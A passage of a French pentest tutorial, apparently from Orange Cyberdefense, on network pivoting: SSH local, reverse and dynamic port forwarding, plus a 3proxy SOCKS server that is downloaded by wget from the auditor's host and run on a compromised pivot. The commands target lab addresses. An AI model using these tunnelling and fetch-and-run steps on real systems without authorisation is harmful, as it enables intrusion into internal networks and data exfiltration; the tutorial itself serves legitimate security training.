consiste à s’introduire dans le réseau interne après avoir compromis une
 machine qui se trouve dans l’organisation. Le pivoting ou déplacement 
latéral est un ensemble de techniques utilisé durant un test d’intrusion
 ou une campagne Red Team. Il consiste à utiliser une machine contrôlée 
par l’attaquant comme d’un rebond, visant ainsi à augmenter la 
visibilité du réseau. Autrement dit, c’est le fait d’accéder à un réseau
 normalement inaccessible, grâce à une machine compromise. Cela permet 
de contourner bon nombre de protections et de mécanismes de surveillance
 réseau, puisque les attaques seront lancées depuis une machine légitime
 faisant partie intégrante du réseau de l’organisation cible.</p><p>Cet 
article couvrira plusieurs techniques de pivoting ainsi que les outils 
existants permettant de mener à bien un déplacement latéral.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-515e4de elementor-widget elementor-widget-heading" data-id="515e4de" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Déplacement latéral : les pré-requis</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-d49bf3a elementor-widget elementor-widget-heading" data-id="d49bf3a" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h4 class="elementor-heading-title elementor-size-default">Connaissances </h4>		</div>
				</div>
				<div class="elementor-element elementor-element-07187d1 elementor-widget elementor-widget-text-editor" data-id="07187d1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><ul class="o-square-list"><li>Réseau : routage, NAT, proxy, iptables</li><li>Hacking : metasploit, reverse/bind shell</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-5973f20 elementor-widget elementor-widget-heading" data-id="5973f20" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h4 class="elementor-heading-title elementor-size-default">Équipements </h4>		</div>
				</div>
				<div class="elementor-element elementor-element-c0194e1 elementor-widget elementor-widget-text-editor" data-id="c0194e1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><ul class="o-square-list"><li>Pivot : une machine contrôlée (VM, machine compromise, serveur de test, etc.)</li><li>Cible
 : dans le cadre d’un test, il peut être intéressant de contrôler la ou 
les machine(s) cible(s). Dans un cas réel, ce n’est pas nécessaire.</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-1cce4f6 elementor-widget elementor-widget-heading" data-id="1cce4f6" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Scénario classique </h3>		</div>
				</div>
				<div class="elementor-element elementor-element-d2e9b23 elementor-widget elementor-widget-text-editor" data-id="d2e9b23" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Lors d’un 
test d’intrusion web, nominalement, l’auditeur peut contacter uniquement
 les serveurs applicatifs 1 &amp; 2 (Srv App 1 &amp; 2) qui sont placés 
dans un cloud ou en DMZ (la zone appelée Edge Network). L’auditeur n’a 
aucun moyen d’accéder directement au réseau interne (la zone appelée 
Core Network) car sa provenance est bloquée par le pare-feu.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-022313d elementor-widget elementor-widget-image" data-id="022313d" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
					<div class="elementor-image">
										<img src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/article_technique_pentest_1.png" class="attachment-large size-large" alt="Le pivoting dans le pentest avec Orange Cyberdefense" srcset="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_1.png 951w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_1-768x422.png 768w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_1-650x357.png 650w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_1-505x277.png 505w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_1-325x178.png 325w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_1-240x132.png 240w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_1-150x82.png 150w" sizes="(max-width: 951px) 100vw, 951px" width="951" height="522">											</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-8984ea5 elementor-widget elementor-widget-text-editor" data-id="8984ea5" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>À un 
moment, l’auditeur trouve une exécution de commande à distance (RCE) sur
 l’application web auditée. L’auditeur est en mesure de compromettre le 
serveur hôte (Srv App 2) et de le forcer à transmettre le trafic de 
l’attaquant vers le réseau interne (Core Network) car le serveur Srv App
 2, lui, est autorisé à accéder à cette zone réseau.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-780c47f elementor-widget elementor-widget-image" data-id="780c47f" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
					<div class="elementor-image">
										<img src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/article_technique_pentest_2-1024x566.png" class="attachment-large size-large" alt="Le pivoting dans le pentest avec Orange Cyberdefense" srcset="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_2-1024x566.png 1024w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_2-768x424.png 768w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_2-650x359.png 650w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_2-505x279.png 505w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_2-325x180.png 325w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_2-240x133.png 240w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_2-150x83.png 150w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/article_technique_pentest_2.png 1338w" sizes="(max-width: 960px) 100vw, 960px" width="960" height="531">											</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4c80354 elementor-widget elementor-widget-heading" data-id="4c80354" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Scénario simplifié: cible avec IP publique</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-c2768df elementor-widget elementor-widget-text-editor" data-id="c2768df" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Nous 
allons utiliser un environnement simplifié pour la démonstration, où la 
machine Srv App 1 symbolise une machine directement accessible sur 
Internet avec une IP publique (front facing) et qui possède une deuxième
 carte réseau pour accéder à un backend dans un réseau interne.</p><p>C’est le cas le plus simple par lequel nous allons commencer.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0158e3b elementor-widget elementor-widget-image" data-id="0158e3b" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
					<div class="elementor-image">
										<img src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/az3-1024x553.png" class="attachment-large size-large" alt="Le pivoting dans le pentest avec Orange Cyberdefense" srcset="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az3-1024x553.png 1024w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az3-768x415.png 768w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az3-650x351.png 650w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az3-505x273.png 505w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az3-325x176.png 325w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az3-240x130.png 240w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az3-150x81.png 150w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/az3.png 1414w" sizes="(max-width: 960px) 100vw, 960px" width="960" height="518">											</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-5e597ab elementor-widget elementor-widget-text-editor" data-id="5e597ab" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Note</strong>
 : Dans les cas suivants, nous allons utiliser une machine Linux 
possédant un serveur openssh comme machine pivot, mais il est tout à 
fait possible d’utiliser putty en CLI ou plink pour accomplir le même 
cheminement sur une machine Windows. S’en suivront des exemples tirant 
parti d’outils multiplateformes.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-2beb192 elementor-widget elementor-widget-heading" data-id="2beb192" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">SSH local port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-1fb3b0e elementor-widget elementor-widget-text-editor" data-id="1fb3b0e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Les connexions depuis le client SSH sont transférées via le serveur SSH puis vers une machine de destination.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-8fe55ee elementor-widget elementor-widget-text-editor" data-id="8fe55ee" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ ssh user@ssh_server -L [bind_address:]local_port:destination_host:destination_hostport</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0ea6d0e elementor-widget elementor-widget-text-editor" data-id="0ea6d0e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Par 
exemple, ici, l’auditeur ouvre le port 32000 en local sur son poste 
(192.168.2.149), se connecte en SSH sur la machine compromise Srv App 1.
 Le serveur SSH de la machine compromise transfère toutes les requêtes 
que l’attaquant fait sur sa machine (127.0.0.1:32000) vers le Srv App 2 
(10.42.42.2:80) en passant par Srv App 1 (192.168.2.105) via SSH (22).</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-1e4c694 elementor-widget elementor-widget-text-editor" data-id="1e4c694" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ ssh noraj@192.168.2.105 -L 127.0.0.1:32000:10.42.42.2:80 -N</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-39f7246 elementor-widget elementor-widget-text-editor" data-id="39f7246" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Note&nbsp;:</strong></p><p>L’option
 -N sert à ne pas exécuter de commande après l’authentification, et donc
 dans notre cas à ne pas lancer de shell puisque nous ne nous servons de
 SSH que comme d’un tunnel.</p><p>Une fois ce tunnel monté, quand 
l’auditeur requête http://127.0.0.1:32000, il demande en fait 
indirectement http://10.42.42.2 (pour l’exemple d’un serveur web).</p><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Simple à mettre en place</li><li>Aucune ouverture de port sur le pivot</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Nécessité que le serveur SSH soit activé</li><li>Nécessité de connaître les login/mots de passe d’un utilisateur</li><li>Aucun serveur SSH natif sous Windows (sauf beta Windows 10)</li><li>Ouverture port par port</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-7b26849 elementor-widget elementor-widget-heading" data-id="7b26849" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">SSH reverse remote port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-1058122 elementor-widget elementor-widget-text-editor" data-id="1058122" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Les connexions depuis le serveur SSH sont transférées via le client SSH, puis vers un serveur de destination.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-49af45b elementor-widget elementor-widget-text-editor" data-id="49af45b" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ ssh user@ssh_server -R [bind_address:]remote_port:destination_host:destination_hostport</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-474c2eb elementor-widget elementor-widget-text-editor" data-id="474c2eb" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Si 
l’auditeur lançait cette commande depuis sa machine, il ne pourrait 
qu’exposer un service de sa machine ou disponible sur son réseau à tout 
le monde pouvant joindre la machine Srv App 1. Si nous prenons l’une des
 deux commandes ci-dessous, une personne qui irait requêter 
192.168.2.105:15000, contacterait la machine de l’attaquant sur le port 
9999.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-14e0b8d elementor-widget elementor-widget-text-editor" data-id="14e0b8d" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">ssh noraj@192.168.2.105 -R 192.168.2.105:15000:127.0.0.1:9999</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-bf48b31 elementor-widget elementor-widget-text-editor" data-id="bf48b31" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>&nbsp;</p><pre><span style="color: #ffffff;">ssh noraj@192.168.2.105 -R 192.168.2.105:15000:192.168.2.149:9999</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-291f866 elementor-widget elementor-widget-text-editor" data-id="291f866" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Si 
l’auditeur remplace l’IP de sa machine par l’IP d’une machine 
compromise, il peut ainsi l’exposer sur un autre réseau. Par exemple, 
dans le cas d’une mission Red Team où l’auditeur aurait compromis une 
machine dans le réseau interne sur lequel il s’est introduit 
physiquement, et qu’il voudrait exposer à l’extérieur (sur Internet) 
afin de pouvoir exfiltrer des données.</p><p>Mais ici, ce n’est pas ce 
que nous cherchons à faire. L’auditeur veut accéder à la machine Srv App
 2 du réseau 10.42.42.0/24 via Srv App 1 et non pas exposer un service 
de sa machine ou de son réseau à l’ensemble du réseau 10.42.42.0/24 
grâce à Srv App 1.</p><p>C’est pourquoi l’auditeur devra lancer cette commande, non pas depuis sa machine, mais depuis la machine pivot (d’où le <strong>reverse</strong> remote port forwarding).</p><p>Pour se faire, se connecter au serveur pivot (Srv App 1) via SSH, via un revese shell, web shell, etc.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4cb1695 elementor-widget elementor-widget-text-editor" data-id="4cb1695" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ ssh noraj@192.168.2.105</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-95c1062 elementor-widget elementor-widget-text-editor" data-id="95c1062" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Il faut donc au préalable que l’auditeur héberge un serveur SSH sur sa propre machine.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4284bb7 elementor-widget elementor-widget-text-editor" data-id="4284bb7" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo systemctl start sshd</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-5529e6a elementor-widget elementor-widget-text-editor" data-id="5529e6a" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Comme nous
 allons ouvrir une connexion SSH depuis un serveur compromis vers notre 
propre machine, il est important de créer un compte dédié sans <em>shell</em> afin d’éviter le <em>hack back</em> d’un administrateur de l’entreprise ou bien un cybercriminel qui aurait réussi à compromettre la machine, lui aussi.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-7cb04e3 elementor-widget elementor-widget-text-editor" data-id="7cb04e3" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ sudo useradd sshpivot --no-create-home --shell /bin/false</span><br><span style="color: #ffffff;">$ sudo passwd sshpivot</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-825adfd elementor-widget elementor-widget-text-editor" data-id="825adfd" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>PS : <span style="color: #ffffff; background-color: #474747; font-family: courier new;">/bin/false</span> doit être ajouté dans <span style="color: #ffffff; background-color: #474747; font-family: courier new;">/etc/shells</span><br>sinon la connexion sera refusée.<br>Puis, depuis la machine pivot, il faut exécuter :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4cc203b elementor-widget elementor-widget-text-editor" data-id="4cc203b" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ ssh sshpivot@192.168.2.149 -R 127.0.0.1:14000:10.42.42.2:80 -N</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b24dffc elementor-widget elementor-widget-text-editor" data-id="b24dffc" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Maintenant, l’auditeur peut requêter http://127.0.0.1:14000 afin de joindre http://10.42.42.2.</p><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Aucun besoin d’un compte privilégié</li><li>Simple à mettre en place</li><li>Inutile que le serveur SSH soit activé</li><li>Inutile de connaître les login/mot de passe d’un utilisateur</li><li>Aucune ouverture de port sur le pivot</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Pas de client SSH natif sous Windows</li><li>Ouverture port par port</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-f47bba4 elementor-widget elementor-widget-heading" data-id="f47bba4" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">SSH dynamic port forwarding</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-6747339 elementor-widget elementor-widget-text-editor" data-id="6747339" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Les 
connexions de divers services seront transférées via le client SSH puis 
via le serveur SSH et, finalement, vers plusieurs machines de 
destination.</p><p>Avec le dynamic port forwarding vous allez ouvrir un 
port local sur la machine pivot. SSH va écouter sur ce port et se 
comporter comme un serveur proxy SOCKS (SOCKS4 ou SOCKS5).</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-069d1b7 elementor-widget elementor-widget-text-editor" data-id="069d1b7" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ ssh user@ssh_server -D [bind_address:]local_port</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ce51bd2 elementor-widget elementor-widget-text-editor" data-id="ce51bd2" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Cela permettra à l’auditeur de se servir du serveur SSH de la machine pivot comme serveur proxy SOCKS avec un binding local.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-c669c67 elementor-widget elementor-widget-text-editor" data-id="c669c67" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ ssh noraj@192.168.2.105 -D 127.0.0.1:12000 -N</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4cf7d38 elementor-widget elementor-widget-text-editor" data-id="4cf7d38" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Par 
exemple, l’auditeur peut ensuite faire des requêtes vers tous les 
réseaux accessibles par la machine pivot en passant par le proxy :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-d4cc231 elementor-widget elementor-widget-text-editor" data-id="d4cc231" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://10.42.42.2 --proxy socks5://127.0.0.1:12000
HTTP/1.1 302 Found
Date: Wed, 28 Aug 2019 08:05:32 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.8
X-Powered-By: PHP/7.3.8
Location: http://10.42.42.2/dashboard/
Content-Type: text/html; charset=UTF-8
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-8f93d06 elementor-widget elementor-widget-text-editor" data-id="8f93d06" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Simple à mettre en place</li><li>Aucune ouverture de port sur le pivot</li><li>Ouverture de port et cible dynamique</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Nécessité que le serveur SSH soit activé</li><li>Nécessité de connaître les login/mot de passe d’un utilisateur</li><li>Pas de serveur SSH natif sous Windows (sauf beta Windows 10)</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e81e8ea elementor-widget elementor-widget-heading" data-id="e81e8ea" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">SSH reverse remote port forwarding + proxy SOCKS</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-efaae37 elementor-widget elementor-widget-text-editor" data-id="efaae37" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Nous avons
 déjà vu la technique de SSH reserve remote port forwarding et ses 
nombreux avantages mais un inconvénient de taille reste le même que pour
 le SSH local port forwarding : le tunnel est ouvert pour un port en 
particulier et rend donc la progression contraignante.</p><p>Pour 
remédier à cela, et autoriser une allocation de ports et de cibles 
dynamiques de la même manière qu’avec le SSH dynamic port forwarding, 
l’astuce consiste à binder un serveur proxy sur le pivot à la place de 
la cible.</p><p>Pour cela, il va falloir déployer un serveur proxy sur le pivot.</p><p>Il y a bien sûr le très connu :<span style="color: #ffffff; background-color: #474747; font-family: courier new;">proxychains</span><br>ou
 sa variante nouvelle génération, qui peut être utile comme client mais 
qui sera difficilement utilisable comme serveur proxy sur le pivot à 
cause des problématiques de compilation. C’est pour cela que nous allons
 plutôt privilégier<br><span style="color: #ffffff; background-color: #474747; font-family: courier new;">3proxy</span></p><ul class="o-square-list"><li><a href="https://github.com/haad/proxychains"><b><u>proxychains</u></b></a> fonctionne uniquement avec des programmes “linkés” dynamiquement et avec la même version utilisée que pour proxychains</li><li><a href="https://github.com/rofl0r/proxychains-ng"><b><u>proxychains-ng</u></b></a> idem</li><li><a href="https://github.com/z3APA3A/3proxy"><b><u>3proxy</u></b></a> : proxy avancé, peut être utilisé en version portable (indépendante)</li></ul><p>Nous allons compiler le binaire à déployer sur le pivot depuis la machine de l’auditeur et distribuer via un serveur HTTP :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b51251d elementor-widget elementor-widget-text-editor" data-id="b51251d" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ git clone https://github.com/z3APA3A/3proxy.git
$ cd 3proxy
$ make -f Makefile.Linux
$ python -m http.server -d bin --bind 192.168.2.149 8080
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-25e02e7 elementor-widget elementor-widget-text-editor" data-id="25e02e7" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Note : </strong></p><p>Si
 le pivot est un Windows, il existe aussi un makefile windows ou des 
binaires précompilés. Idem pour d’autres OS plus exotiques.</p><p>Ici, nous utiliserons un des binaires standelone (socks) fournit par : <span style="color: #ffffff; background-color: #474747; font-family: courier new;">3proxy</span><br>plutôt que le binaire complet : <span style="color: #ffffff; background-color: #474747; font-family: courier new;">3proxy</span><br>qui est plus puissant mais qui nécessite un fichier de configuration.</p><p>Sur
 le pivot on télécharge le binaire, nous lançons le serveur proxy sur le
 port 10080.&nbsp; Finalement, nous lançons le SSH reverse remote port 
forwarding :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-e683985 elementor-widget elementor-widget-text-editor" data-id="e683985" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ wget http://192.168.2.149:8080/socks
$ chmod u+x socks
$ ./socks '-?'
$ ./socks -p10080 -tstop -d
$ ssh sshpivot@192.168.2.149 -R 127.0.0.1:14000:127.0.0.1:10080 -N
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-29263d1 elementor-widget elementor-widget-text-editor" data-id="29263d1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Sur sa machine, l’auditeur peut maintenant utiliser ses outils à travers le proxy SOCKS.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-4d17d7d elementor-widget elementor-widget-text-editor" data-id="4d17d7d" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://10.42.42.2 --proxy socks5://127.0.0.1:14000
HTTP/1.1 302 Found
Date: Wed, 28 Aug 2019 09:22:40 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.8
X-Powered-By: PHP/7.3.8
Location: http://10.42.42.2/dashboard/
Content-Type: text/html; charset=UTF-8
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-eb8efd7 elementor-widget elementor-widget-text-editor" data-id="eb8efd7" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Nul besoin que le serveur SSH soit activé</li><li>Nul besoin de connaître les login/mot de passe d’un utilisateur</li><li>Ouverture de port et cible dynamique</li></ul><p>Inconvénients:</p><ul class="o-square-list"><li>Pas de client SSH natif sous Windows</li><li>Ouverture d’un port local sur le pivot</li><li>Déploiement d’un serveur proxy sur le pivot</li><li>Tunnel TCP</li></ul></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-1637430 elementor-widget elementor-widget-heading" data-id="1637430" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">VPN over SSH</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-d4b1c3f elementor-widget elementor-widget-text-editor" data-id="d4b1c3f" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Exemple théorique :</strong></p><p>L’inconvénient
 des méthodes précédentes est l’utilisation d’un tunnel TCP. Avec 
openssh 4.3+ il est possible d’ouvrir un tunnel de couche 2 à travers 
une session SSH. Cela donne à l’auditeur le contrôle sur le trafic IP et
 donc la possibilité de lancer des scans SYN avec nmap et surtout de ne 
pas avoir besoin de faire passer ses outils à travers un proxy. En 
effet, à titre d’exemple, “proxifier” nmap à travers proxychains 
ralentit considérablement la vitesse de scan et limite fortement les 
possibilités/options de scans utilisables.</p><p>Comme on peut le voir 
dans la section avantages/inconvénients, les contreparties de la 
“tunnellisation” de couche 2 se payent au prix fort.</p><p>Le schéma 
ci-dessous symbolise plusieurs réseaux, car, en général, Internet ou 
plusieurs sous-réseaux internes séparent l’auditeur de la machine 
compromise. Sinon, il y a peu d’intérêt à monter un VPN entre les deux.</p><p>Le lien de couleur orange symbolise la liaison VPN entre l’auditeur et la machine pivot.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-180ccb7 elementor-widget elementor-widget-image" data-id="180ccb7" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
					<div class="elementor-image">
